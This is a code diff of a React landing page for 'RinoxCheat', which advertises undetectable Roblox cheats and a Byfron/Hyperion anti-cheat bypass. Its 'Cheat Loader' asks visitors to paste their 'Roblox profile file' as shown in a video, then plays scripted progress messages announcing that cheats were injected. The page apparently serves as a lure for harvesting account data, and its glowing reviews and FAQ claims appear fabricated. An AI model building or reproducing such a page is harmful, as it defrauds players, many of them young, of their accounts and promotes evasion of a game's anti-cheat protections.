@@ -13,48 +13,254 @@ import {
   Eye,
   Wind,
   Activity,
+  ChevronDown,
+  Star,
 } from "lucide-react";
 
-const STEPS = [
+type Language = "fr" | "en";
+
+const TRANSLATIONS = {
+  fr: {
+    versionBadge: "2026 Edition · v3.0 lancé",
+    hero_title: "Cheats Roblox Premium.",
+    hero_highlight: "Indétectable. Instantané.",
+    hero_desc: "Le toolkit de cheats Roblox le plus avancé en 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion. Rapide, propre, indétectable.",
+    getCheats: "Obtenir les cheats",
+    watchTutorial: "Voir le tutoriel",
+    undetected: "Indétectable",
+    instantDelivery: "Livraison instantanée",
+    allGames: "Tous les jeux Roblox",
+    features: "Cheats",
+    get: "Obtenir",
+    tutorial: "Tutoriel",
+    online: "En ligne",
+    aimbotTitle: "Aimbot",
+    aimbotDesc: "Lock-on précis, smoothing réglable, FOV personnalisable pour tous les Roblox shooters.",
+    espTitle: "ESP & Wallhack",
+    espDesc: "Voir les joueurs, items et objectifs à travers les murs — distance, HP, équipe.",
+    flyTitle: "Fly, Speed & No-Clip",
+    flyDesc: "Mouvement total — vol, vitesse boostée et traversée des collisions.",
+    undetectedTitle: "Indétectable",
+    undetectedDesc: "Bypass Byfron & Hyperion mis à jour en continu pour une session safe.",
+    cheatLoaderTitle: "Cheat Loader",
+    secureSession: "Session sécurisée",
+    robloxSupported: "Supporté",
+    profileLabel: "Indique ton profil Roblox comme sur la vidéo pour recevoir les cheats.",
+    profilePlaceholder: "Fichier de profil Roblox...",
+    deliveryNote: "Les cheats sont livrés directement à ton compte.",
+    injectButton: "Injecter les cheats",
+    loading: "Chargement...",
+    cheatsInjected: "Cheats injectés",
+    launchRoblox: "Lance Roblox — tes cheats seront actifs sous 2–3 minutes.",
+    tutorialTitle: "Comment ça marche",
+    tutorialDesc: "2 minutes pour tout comprendre avant de lancer tes cheats.",
+    videoNotDisplaying: "Si la vidéo ne s'affiche pas ici, ",
+    openYoutube: "ouvrez-la sur YouTube",
+    copyright: "RinoxCheat © 2026",
+    privateNote: "Outil privé · À utiliser à vos risques et périls",
+    faqTitle: "Questions Fréquemment Posées",
+    faqDesc: "Trouve les réponses à tes questions les plus courantes",
+    reviewsTitle: "Avis Clients",
+    reviewsDesc: "Ce que disent nos utilisateurs satisfaits",
+    missingInfo: "Info manquante",
+    errorMsg: "Veuillez remplir le champ du profil",
+    connecting: "Connexion au serveur Roblox...",
+    loading2: "Chargement des modules...",
+    bypassing: "Contournement de Byfron / Hyperion...",
+    injecting: "Injection des scripts...",
+  },
+  en: {
+    versionBadge: "2026 Edition · v3.0 shipped",
+    hero_title: "Premium Roblox cheats.",
+    hero_highlight: "Undetected. Instant.",
+    hero_desc: "The most advanced Roblox cheat toolkit in 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion. Fast, clean, undetectable.",
+    getCheats: "Get the cheats",
+    watchTutorial: "Watch tutorial",
+    undetected: "Undetected",
+    instantDelivery: "Instant delivery",
+    allGames: "All Roblox games",
+    features: "Cheats",
+    get: "Get",
+    tutorial: "Tutorial",
+    online: "Online",
+    aimbotTitle: "Aimbot",
+    aimbotDesc: "Precise lock-on, adjustable smoothing, customizable FOV for all Roblox shooters.",
+    espTitle: "ESP & Wallhack",
+    espDesc: "See players, items and objectives through walls — distance, HP, team.",
+    flyTitle: "Fly, Speed & No-Clip",
+    flyDesc: "Total movement — flight, boosted speed and collision traversal.",
+    undetectedTitle: "Undetected",
+    undetectedDesc: "Bypass Byfron & Hyperion continuously updated for safe sessions.",
+    cheatLoaderTitle: "Cheat Loader",
+    secureSession: "Secure session",
+    robloxSupported: "Supported",
+    profileLabel: "Enter your Roblox profile as shown in the video to receive cheats.",
+    profilePlaceholder: "Roblox Profile File...",
+    deliveryNote: "Cheats are delivered directly to your account.",
+    injectButton: "Inject cheats",
+    loading: "Loading...",
+    cheatsInjected: "Cheats Injected",
+    launchRoblox: "Launch Roblox — your cheats will be active within 2–3 minutes.",
+    tutorialTitle: "How it works",
+    tutorialDesc: "2 minutes to understand everything before launching your cheats.",
+    videoNotDisplaying: "If the video doesn't display here, ",
+    openYoutube: "open it on YouTube",
+    copyright: "RinoxCheat © 2026",
+    privateNote: "Private tool · Use at your own risk",
+    faqTitle: "Frequently Asked Questions",
+    faqDesc: "Find answers to your most common questions",
+    reviewsTitle: "Customer Reviews",
+    reviewsDesc: "What our satisfied users are saying",
+    missingInfo: "Missing info",
+    errorMsg: "Please fill in the profile field",
+    connecting: "Connecting to Roblox server...",
+    loading2: "Loading cheat modules...",
+    bypassing: "Bypassing Byfron / Hyperion...",
+    injecting: "Injecting scripts...",
+  },
+};
+
+const STEPS_FR = [
+  "Connexion au serveur Roblox...",
+  "Chargement des modules...",
+  "Contournement de Byfron / Hyperion...",
+  "Injection des scripts...",
+];
+
+const STEPS_EN = [
   "Connecting to Roblox server...",
   "Loading cheat modules...",
   "Bypassing Byfron / Hyperion...",
   "Injecting scripts...",
 ];
 
-const FEATURES = [
-  {
-    icon: Crosshair,
-    title: "Aimbot",
-    desc: "Lock-on précis, smoothing réglable, FOV personnalisable pour tous les Roblox shooters.",
-  },
-  {
-    icon: Eye,
-    title: "ESP & Wallhack",
-    desc: "Voir les joueurs, items et objectifs à travers les murs — distance, HP, équipe.",
-  },
-  {
-    icon: Wind,
-    title: "Fly, Speed & No-Clip",
-    desc: "Mouvement total — vol, vitesse boostée et traversée des collisions.",
-  },
-  {
-    icon: ShieldCheck,
-    title: "Undetected",
-    desc: "Bypass Byfron & Hyperion mis à jour en continu pour une session safe.",
-  },
-];
-
 const Index = () => {
+  const [language, setLanguage] = useState<Language>("fr");
   const [target, setTarget] = useState("");
   const [loading, setLoading] = useState(false);
   const [steps, setSteps] = useState<string[]>([]);
   const [done, setDone] = useState(false);
+  const [expandedFaq, setExpandedFaq] = useState<number | null>(null);
+
+  const t = TRANSLATIONS[language];
+  const STEPS = language === "fr" ? STEPS_FR : STEPS_EN;
+
+  const FEATURES = [
+    {
+      icon: Crosshair,
+      title: t.aimbotTitle,
+      desc: t.aimbotDesc,
+    },
+    {
+      icon: Eye,
+      title: t.espTitle,
+      desc: t.espDesc,
+    },
+    {
+      icon: Wind,
+      title: t.flyTitle,
+      desc: t.flyDesc,
+    },
+    {
+      icon: ShieldCheck,
+      title: t.undetectedTitle,
+      desc: t.undetectedDesc,
+    },
+  ];
+
+  const FAQs = language === "fr" ? [
+    {
+      q: "Comment fonctionne le bypass Byfron ?",
+      a: "Notre système utilise des techniques avancées de détection d'anti-cheat pour contourner Byfron en temps réel.",
+    },
+    {
+      q: "Est-ce vraiment indétectable ?",
+      a: "Oui, nos cheats sont mis à jour continuellement pour éviter les détections. Nous offrons une protection maximale.",
+    },
+    {
+      q: "Combien de temps pour recevoir les cheats ?",
+      a: "Les cheats sont livrés instantanément après injection. Ils seront actifs en 2-3 minutes.",
+    },
+    {
+      q: "Fonctionne sur tous les jeux Roblox ?",
+      a: "Oui, notre toolkit fonctionne sur pratiquement tous les jeux Roblox populaires.",
+    },
+  ] : [
+    {
+      q: "How does the Byfron bypass work?",
+      a: "Our system uses advanced anti-cheat detection techniques to bypass Byfron in real-time.",
+    },
+    {
+      q: "Is it really undetectable?",
+      a: "Yes, our cheats are continuously updated to avoid detection. We provide maximum protection.",
+    },
+    {
+      q: "How long to receive the cheats?",
+      a: "Cheats are delivered instantly after injection. They will be active within 2-3 minutes.",
+    },
+    {
+      q: "Does it work on all Roblox games?",
+      a: "Yes, our toolkit works on virtually all popular Roblox games.",
+    },
+  ];
+
+  const REVIEWS = language === "fr" ? [
+    {
+      name: "Lucas",
+      game: "Arsenal",
+      rating: 5,
+      text: "Les cheats marchent parfaitement ! Aucune détection en 2 mois.",
+    },
+    {
+      name: "Sarah",
+      game: "Phantom Forces",
+      rating: 5,
+      text: "Incroyable ! L'aimbot est très smooth et l'ESP est ultra utile.",
+    },
+    {
+      name: "Marco",
+      game: "Jailbreak",
+      rating: 5,
+      text: "Livraison instantanée, interface simple, marche du tonnerre !",
+    },
+    {
+      name: "Emma",
+      game: "Da Hood",
+      rating: 5,
+      text: "Meilleur investissement jamais fait. Support réactif aussi !",
+    },
+  ] : [
+    {
+      name: "Lucas",
+      game: "Arsenal",
+      rating: 5,
+      text: "Cheats work perfectly! No detection for 2 months.",
+    },
+    {
+      name: "Sarah",
+      game: "Phantom Forces",
+      rating: 5,
+      text: "Incredible! The aimbot is very smooth and the ESP is ultra useful.",
+    },
+    {
+      name: "Marco",
+      game: "Jailbreak",
+      rating: 5,
+      text: "Instant delivery, simple interface, works great!",
+    },
+    {
+      name: "Emma",
+      game: "Da Hood",
+      rating: 5,
+      text: "Best investment ever. Responsive support too!",
+    },
+  ];
 
   useEffect(() => {
-    document.title = "RinoxCheat — Premium Roblox Cheats 2026";
-    const desc =
-      "RinoxCheat: les meilleurs cheats Roblox undetected en 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion.";
+    document.title = language === "fr" ? "RinoxCheat — Cheats Roblox Premium 2026" : "RinoxCheat — Premium Roblox Cheats 2026";
+    const desc = language === "fr" 
+      ? "RinoxCheat: les meilleurs cheats Roblox indétectables en 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion."
+      : "RinoxCheat: The best undetectable Roblox cheats in 2026. Aimbot, ESP, Fly, Speed — bypass Byfron & Hyperion.";
     let m = document.querySelector('meta[name="description"]');
     if (!m) {
       m = document.createElement("meta");
@@ -62,13 +268,13 @@ const Index = () => {
       document.head.appendChild(m);
     }
     m.setAttribute("content", desc);
-  }, []);
+  }, [language]);
 
   const handleHack = async () => {
     if (!target.trim()) {
       toast({
-        title: "Info manquante",
-        description: "c",
+        title: t.missingInfo,
+        description: t.errorMsg,
         variant: "destructive",
       });
       return;
@@ -128,19 +334,44 @@ const Index = () => {
       <header className="sticky top-0 z-30 backdrop-blur-md bg-background/70 border-b border-border/60">
         <div className="max-w-6xl mx-auto px-5 sm:px-8 h-14 flex items-center justify-between">
           <div className="flex items-center gap-2 group">
-            <div className="h-7 w-7 rounded-md bg-gradient-to-br from-primary to-[hsl(var(--primary-glow))] bg-[length:200%_200%] animate-gradient-pan flex items-center justify-center transition-[...]">
+            <div className="h-7 w-7 rounded-md bg-gradient-to-br from-primary to-[hsl(var(--primary-glow))] bg-[length:200%_200%] animate-gradient-pan flex items-center justify-center transition-transform duration-300 group-hover:scale-110">
               <Crosshair className="h-4 w-4 text-primary-foreground" />
             </div>
             <span className="font-semibold tracking-tight">RinoxCheat</span>
           </div>
           <div className="hidden sm:flex items-center gap-6 text-sm text-muted-foreground">
-            <a href="#features" className="story-link hover:text-foreground transition-colors">Cheats</a>
-            <a href="#tool" className="story-link hover:text-foreground transition-colors">Get</a>
-            <a href="#tutorial" className="story-link hover:text-foreground transition-colors">Tutorial</a>
+            <a href="#features" className="hover:text-foreground transition-colors hover:scale-105 inline-block">{t.features}</a>
+            <a href="#tool" className="hover:text-foreground transition-colors hover:scale-105 inline-block">{t.get}</a>
+            <a href="#tutorial" className="hover:text-foreground transition-colors hover:scale-105 inline-block">{t.tutorial}</a>
           </div>
-          <div className="flex items-center gap-2 text-xs text-muted-foreground">
-            <span className="h-2 w-2 rounded-full bg-primary live-dot" />
-            <span>Online</span>
+          <div className="flex items-center gap-4">
+            {/* Language Selector */}
+            <div className="flex items-center gap-2 bg-secondary/40 rounded-full p-1 border border-border/40">
+              <button
+                onClick={() => setLanguage("fr")}
+                className={`px-3 py-1 rounded-full text-sm font-medium transition-all transform ${
+                  language === "fr"
+                    ? "bg-primary text-primary-foreground scale-105"
+                    : "text-muted-foreground hover:text-foreground hover:scale-105"
+                }`}
+              >
+                🇫🇷 FR
+              </button>
+              <button
+                onClick={() => setLanguage("en")}
+                className={`px-3 py-1 rounded-full text-sm font-medium transition-all transform ${
+                  language === "en"
+                    ? "bg-primary text-primary-foreground scale-105"
+                    : "text-muted-foreground hover:text-foreground hover:scale-105"
+                }`}
+              >
+                🇺🇸 EN
+              </button>
+            </div>
+            <div className="flex items-center gap-2 text-xs text-muted-foreground">
+              <span className="h-2 w-2 rounded-full bg-primary live-dot" />
+              <span>{t.online}</span>
+            </div>
           </div>
         </div>
       </header>
@@ -148,41 +379,40 @@ const Index = () => {
       <main className="max-w-6xl mx-auto px-5 sm:px-8 pb-20">
         {/* Hero */}
         <section className="pt-16 sm:pt-24 pb-12 text-center max-w-3xl mx-auto">
-          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-border bg-secondary/60 text-xs text-muted-foreground mb-6 animate-fade-in">
+          <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-border bg-secondary/60 text-xs text-muted-foreground mb-6 animate-fade-in hover:scale-105 transition-transform duration-300">
             <Activity className="h-3.5 w-3.5 text-primary" />
-            <span>2026 Edition · v3.0 just shipped</span>
+            <span>{t.versionBadge}</span>
           </div>
           <h1
-            className="text-4xl sm:text-6xl font-semibold tracking-tight leading-[1.05] mb-5 animate-fade-in"
+            className="text-4xl sm:text-6xl font-semibold tracking-tight leading-[1.05] mb-5 animate-fade-in hover:scale-105 transition-transform duration-500"
             style={{ animationDelay: "80ms" }}
           >
-            Premium Roblox cheats. <br className="hidden sm:block" />
+            {t.hero_title} <br className="hidden sm:block" />
             <span className="text-gradient bg-[length:200%_auto] animate-gradient-pan">
-              Undetected. Instant.
+              {t.hero_highlight}
             </span>
           </h1>
           <p
-            className="text-muted-foreground text-base sm:text-lg leading-relaxed max-w-xl mx-auto animate-fade-in"
+            className="text-muted-foreground text-base sm:text-lg leading-relaxed max-w-xl mx-auto animate-fade-in hover:text-foreground transition-colors duration-300"
             style={{ animationDelay: "160ms" }}
           >
-            Le toolkit de cheats Roblox le plus avancé en 2026. Aimbot, ESP,
-            Fly, Speed — bypass Byfron & Hyperion. Rapide, propre, indétectable.
+            {t.hero_desc}
           </p>
           <div
             className="mt-8 flex items-center justify-center gap-3 animate-fade-in"
             style={{ animationDelay: "240ms" }}
           >
             <a href="#tool">
-              <Button className="h-11 px-6 rounded-full font-medium hover-scale shadow-[0_8px_30px_-8px_hsl(var(--primary)/0.6)]">
-                Get the cheats
+              <Button className="h-11 px-6 rounded-full font-medium shadow-[0_8px_30px_-8px_hsl(var(--primary)/0.6)] hover:scale-110 hover:shadow-[0_12px_40px_-8px_hsl(var(--primary)/0.8)] transition-all duration-300 animate-bounce-in">
+                {t.getCheats}
               </Button>
             </a>
             <a href="#tutorial">
               <Button
                 variant="secondary"
-                className="h-11 px-6 rounded-full font-medium hover-scale"
+                className="h-11 px-6 rounded-full font-medium hover:scale-110 transition-all duration-300"
               >
-                <Play className="h-4 w-4 mr-1.5" /> Watch tutorial
+                <Play className="h-4 w-4 mr-1.5" /> {t.watchTutorial}
               </Button>
             </a>
           </div>
@@ -191,14 +421,14 @@ const Index = () => {
             className="mt-10 flex flex-wrap items-center justify-center gap-x-8 gap-y-3 text-xs text-muted-foreground animate-fade-in"
             style={{ animationDelay: "320ms" }}
           >
-            <span className="flex items-center gap-1.5">
-              <ShieldCheck className="h-3.5 w-3.5 text-primary" /> Undetected
+            <span className="flex items-center gap-1.5 hover:text-primary transition-colors duration-300 transform hover:scale-110">
+              <ShieldCheck className="h-3.5 w-3.5 text-primary" /> {t.undetected}
             </span>
-            <span className="flex items-center gap-1.5">
-              <Zap className="h-3.5 w-3.5 text-primary" /> Instant delivery
+            <span className="flex items-center gap-1.5 hover:text-primary transition-colors duration-300 transform hover:scale-110">
+              <Zap className="h-3.5 w-3.5 text-primary" /> {t.instantDelivery}
             </span>
-            <span className="flex items-center gap-1.5">
-              <Gamepad2 className="h-3.5 w-3.5 text-primary" /> All Roblox games
+            <span className="flex items-center gap-1.5 hover:text-primary transition-colors duration-300 transform hover:scale-110">
+              <Gamepad2 className="h-3.5 w-3.5 text-primary" /> {t.allGames}
             </span>
           </div>
         </section>
@@ -212,14 +442,14 @@ const Index = () => {
           {FEATURES.map((f, i) => (
             <div
               key={f.title}
-              className="group rounded-2xl border border-border bg-card/60 backdrop-blur p-5 hover:border-primary/40 hover:-translate-y-1 hover:shadow-[0_20px_40px_-20px_hsl(var(--primary)/0.4)] [...]"
+              className="group rounded-2xl border border-border bg-card/60 backdrop-blur p-5 hover:border-primary/40 hover:-translate-y-2 hover:shadow-[0_20px_40px_-20px_hsl(var(--primary)/0.4)] transition-all duration-300 animate-fade-in transform hover:scale-105 cursor-pointer tilt-hover"
               style={{ animationDelay: `${i * 100}ms` }}
             >
-              <div className="h-9 w-9 rounded-lg bg-primary/10 border border-primary/20 flex items-center justify-center mb-4 transition-transform duration-300 group-hover:scale-110 group-hover:r[...]">
+              <div className="h-9 w-9 rounded-lg bg-primary/10 border border-primary/20 flex items-center justify-center mb-4 transition-all duration-300 group-hover:scale-125 group-hover:rotate-12 group-hover:bg-primary/20 group-hover:icon-glow">
                 <f.icon className="h-4 w-4 text-primary" />
               </div>
-              <h3 className="font-medium mb-1">{f.title}</h3>
-              <p className="text-sm text-muted-foreground leading-relaxed">
+              <h3 className="font-medium mb-1 group-hover:text-primary transition-colors">{f.title}</h3>
+              <p className="text-sm text-muted-foreground leading-relaxed group-hover:text-foreground/80 transition-colors">
                 {f.desc}
               </p>
             </div>
@@ -232,56 +462,56 @@ const Index = () => {
           aria-label="Cheat panel"
           className="max-w-md mx-auto"
         >
-          <div className="rounded-2xl border border-border bg-card/80 backdrop-blur shadow-[var(--shadow-card)] overflow-hidden animate-scale-in">
+          <div className="rounded-2xl border border-border bg-card/80 backdrop-blur shadow-[var(--shadow-card)] overflow-hidden animate-scale-in hover:shadow-[0_20px_60px_-20px_hsl(var(--primary)/0.4)] transition-all duration-300">
             <div className="flex items-center justify-between px-5 py-3 border-b border-border bg-secondary/40">
               <div className="flex items-center gap-2 text-sm font-medium">
-                <Crosshair className="h-4 w-4 text-primary" />
-                Cheat Loader
+                <Crosshair className="h-4 w-4 text-primary animate-spin-slow" />
+                {t.cheatLoaderTitle}
               </div>
               <span className="text-[10px] tracking-widest text-muted-foreground uppercase">
-                Secure session
+                {t.secureSession}
               </span>
             </div>
 
             <div className="p-5 sm:p-6">
-              <div className="flex items-center justify-between mb-4 p-3 rounded-lg bg-input border border-border">
+              <div className="flex items-center justify-between mb-4 p-3 rounded-lg bg-input border border-border hover:border-primary/40 transition-all duration-300 transform hover:scale-105">
                 <div className="flex items-center gap-2.5">
                   <Gamepad2 className="h-4 w-4 text-primary" />
                   <span className="text-sm font-medium">Roblox</span>
                 </div>
                 <span className="text-[10px] tracking-widest text-primary uppercase">
-                  Supported
+                  {t.robloxSupported}
                 </span>
               </div>
 
               <label htmlFor="target" className="block text-sm font-medium mt-1 mb-2">
-                Indique ton profile Roblox comme sur la vidéo pour recevoir les cheats.
+                {t.profileLabel}
               </label>
               <Input
                 id="target"
                 value={target}
                 onChange={(e) => setTarget(e.target.value)}
                 disabled={loading}
-                placeholder="Profile File Roblox..."
+                placeholder={t.profilePlaceholder}
                 maxLength={5000}
-                className="h-11 rounded-lg bg-input border-border focus-visible:ring-primary"
+                className="h-11 rounded-lg bg-input border-border focus-visible:ring-primary hover:border-primary/40 transition-all duration-300"
               />
               <p className="text-xs text-muted-foreground mt-2">
-                Les cheats sont livrés directement à ton compte.
+                {t.deliveryNote}
               </p>
 
               <Button
                 onClick={handleHack}
                 disabled={loading}
-                className="w-full mt-5 h-12 rounded-lg font-medium text-base hover-scale shadow-[0_8px_30px_-8px_hsl(var(--primary)/0.6)] disabled:opacity-80 disabled:hover:scale-100"
+                className="w-full mt-5 h-12 rounded-lg font-medium text-base shadow-[0_8px_30px_-8px_hsl(var(--primary)/0.6)] disabled:opacity-80 disabled:hover:scale-100 hover:scale-105 hover:shadow-[0_12px_40px_-8px_hsl(var(--primary)/0.8)] transition-all duration-300 transform"
               >
                 {loading ? (
                   <span className="flex items-center gap-2">
                     <span className="h-4 w-4 rounded-full border-2 border-primary-foreground/40 border-t-primary-foreground animate-spin" />
-                    Loading...
+                    {t.loading}
                   </span>
                 ) : (
-                  "Inject cheats"
+                  t.injectButton
                 )}
               </Button>
 
@@ -290,21 +520,21 @@ const Index = () => {
                   {steps.map((s, i) => (
                     <div
                       key={i}
-                      className="animate-slide-in-right flex items-center gap-2 text-sm text-muted-foreground"
+                      className="animate-slide-in-right flex items-center gap-2 text-sm text-muted-foreground hover:text-primary transition-colors duration-300"
                       style={{ animationDelay: `${i * 60}ms` }}
                     >
-                      <CheckCircle2 className="h-4 w-4 text-primary shrink-0" />
+                      <CheckCircle2 className="h-4 w-4 text-primary shrink-0 animate-bounce-in" />
                       <span>{s}</span>
                     </div>
                   ))}
                   {done && (
-                    <div className="animate-scale-in mt-4 p-4 rounded-lg bg-primary/10 border border-primary/30">
+                    <div className="animate-scale-in mt-4 p-4 rounded-lg bg-primary/10 border border-primary/30 hover:bg-primary/20 hover:shadow-[0_0_20px_hsl(var(--primary)/0.3)] transition-all duration-300">
                       <div className="flex items-center gap-2 font-medium text-primary mb-1">
-                        <CheckCircle2 className="h-4 w-4" />
-                        Cheats injectés
+                        <CheckCircle2 className="h-4 w-4 animate-pulse-brightness" />
+                        {t.cheatsInjected}
                       </div>
                       <p className="text-sm text-foreground/80">
-                        Lance Roblox — tes cheats seront actifs sous 2–3 minutes.
+                        {t.launchRoblox}
                       </p>
                     </div>
                   )}
@@ -321,18 +551,18 @@ const Index = () => {
           className="max-w-3xl mx-auto mt-20"
         >
           <div className="text-center mb-6">
-            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-border bg-secondary/60 text-xs text-muted-foreground mb-4">
+            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full border border-border bg-secondary/60 text-xs text-muted-foreground mb-4 hover:scale-105 transition-transform duration-300">
               <Play className="h-3.5 w-3.5 text-primary" />
-              <span>Tutorial</span>
+              <span>{t.tutorial}</span>
             </div>
-            <h2 className="text-2xl sm:text-3xl font-semibold tracking-tight">
-              Comment ça marche
+            <h2 className="text-2xl sm:text-3xl font-semibold tracking-tight hover:text-primary transition-colors duration-300">
+              {t.tutorialTitle}
             </h2>
-            <p className="text-sm text-muted-foreground mt-2">
-              2 minutes pour tout comprendre avant de lancer tes cheats.
+            <p className="text-sm text-muted-foreground mt-2 hover:text-foreground transition-colors duration-300">
+              {t.tutorialDesc}
             </p>
           </div>
-          <div className="relative aspect-video w-full rounded-2xl overflow-hidden border border-border bg-card glow-ring">
+          <div className="relative aspect-video w-full rounded-2xl overflow-hidden border border-border bg-card glow-ring hover:shadow-[0_0_40px_hsl(var(--primary)/0.3)] transition-all duration-300 transform hover:scale-105">
             <iframe
               className="absolute inset-0 w-full h-full"
               src="https://www.youtube-nocookie.com/embed/hXn2q5PHNGs"
@@ -344,20 +574,97 @@ const Index = () => {
             ></iframe>
           </div>
           <p className="mt-2 text-center text-xs text-muted-foreground">
-            Si la vidéo ne s'affiche pas ici, <a className="underline" href="https://youtu.be/tLsw-blhUAI" target="_blank" rel="noopener noreferrer">ouvrez-la sur YouTube</a>.
+            {t.videoNotDisplaying}<a className="underline hover:text-primary transition-colors" href="https://youtu.be/tLsw-blhUAI" target="_blank" rel="noopener noreferrer">{t.openYoutube}</a>.
           </p>
+        </section>
+
+        {/* Reviews */}
+        <section className="max-w-4xl mx-auto mt-24">
+          <div className="text-center mb-10">
+            <h2 className="text-3xl font-semibold tracking-tight mb-2 hover:text-primary transition-colors duration-300">
+              {t.reviewsTitle}
+            </h2>
+            <p className="text-muted-foreground hover:text-foreground transition-colors duration-300">
+              {t.reviewsDesc}
+            </p>
+          </div>
+          <div className="grid sm:grid-cols-2 gap-4">
+            {REVIEWS.map((review, i) => (
+              <div
+                key={i}
+                className="rounded-2xl border border-border bg-card/60 backdrop-blur p-6 hover:border-primary/40 hover:bg-card/80 hover:shadow-[0_20px_40px_-20px_hsl(var(--primary)/0.4)] transition-all duration-300 animate-fade-in transform hover:scale-105 hover:-translate-y-1"
+                style={{ animationDelay: `${i * 100}ms` }}
+              >
+                <div className="flex items-center gap-3 mb-3">
+                  <div className="w-10 h-10 rounded-full bg-primary/20 flex items-center justify-center font-semibold text-primary">
+                    {review.name[0]}
+                  </div>
+                  <div>
+                    <div className="font-medium">{review.name}</div>
+                    <div className="text-xs text-muted-foreground">{review.game}</div>
+                  </div>
+                </div>
+                <div className="flex gap-1 mb-2">
+                  {Array.from({ length: review.rating }).map((_, i) => (
+                    <Star key={i} className="h-4 w-4 fill-primary text-primary animate-pulse-brightness" style={{ animationDelay: `${i * 100}ms` }} />
+                  ))}
+                </div>
+                <p className="text-sm text-muted-foreground hover:text-foreground transition-colors">
+                  "{review.text}"
+                </p>
+              </div>
+            ))}
+          </div>
+        </section>
+
+        {/* FAQ */}
+        <section className="max-w-2xl mx-auto mt-24">
+          <div className="text-center mb-10">
+            <h2 className="text-3xl font-semibold tracking-tight mb-2 hover:text-primary transition-colors duration-300">
+              {t.faqTitle}
+            </h2>
+            <p className="text-muted-foreground hover:text-foreground transition-colors duration-300">
+              {t.faqDesc}
+            </p>
+          </div>
+          <div className="space-y-3">
+            {FAQs.map((faq, i) => (
+              <div
+                key={i}
+                className="rounded-xl border border-border bg-card/60 backdrop-blur overflow-hidden hover:border-primary/40 transition-all duration-300 animate-fade-in"
+                style={{ animationDelay: `${i * 50}ms` }}
+              >
+                <button
+                  onClick={() => setExpandedFaq(expandedFaq === i ? null : i)}
+                  className="w-full px-6 py-4 flex items-center justify-between hover:bg-secondary/40 transition-all duration-300 text-left hover:scale-105 origin-left"
+                >
+                  <span className="font-medium hover:text-primary transition-colors">{faq.q}</span>
+                  <ChevronDown
+                    className={`h-5 w-5 text-primary transition-transform duration-300 ${
+                      expandedFaq === i ? "rotate-180" : ""
+                    }`}
+                  />
+                </button>
+                {expandedFaq === i && (
+                  <div className="px-6 py-4 border-t border-border bg-secondary/20 animate-float-up text-sm text-muted-foreground hover:text-foreground transition-colors">
+                    {faq.a}
+                  </div>
+                )}
+              </div>
+            ))}
+          </div>
         </section>
       </main>
 
-      <footer className="border-t border-border/60">
+      <footer className="border-t border-border/60 mt-24">
         <div className="max-w-6xl mx-auto px-5 sm:px-8 py-8 flex flex-col sm:flex-row items-center justify-between gap-3 text-xs text-muted-foreground">
-          <div className="flex items-center gap-2">
+          <div className="flex items-center gap-2 hover:text-primary transition-colors duration-300">
             <div className="h-5 w-5 rounded-md bg-gradient-to-br from-primary to-[hsl(var(--primary-glow))] flex items-center justify-center">
               <Crosshair className="h-3 w-3 text-primary-foreground" />
             </div>
-            <span>RinoxCheat © 2026</span>
+            <span>{t.copyright}</span>
           </div>
-          <p>Private tool · Use at your own risk</p>
+          <p className="hover:text-primary transition-colors duration-300">{t.privateNote}</p>
         </div>
       </footer>
     </div>
